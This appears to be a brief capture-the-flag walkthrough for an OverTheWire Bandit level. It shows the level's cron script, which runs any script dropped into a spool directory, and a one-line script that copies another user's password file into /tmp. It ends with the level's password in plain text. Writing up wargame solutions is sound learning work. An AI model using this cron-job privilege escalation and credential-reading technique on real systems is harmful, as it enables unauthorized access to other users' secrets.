```sh
bandit23@bandit:/usr/bin$ cat cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

```sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mytmp934/pass.txt
```

`cp`
```
cp file.txt /spool/foo/
cp /tmp/file.txt .
```

gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8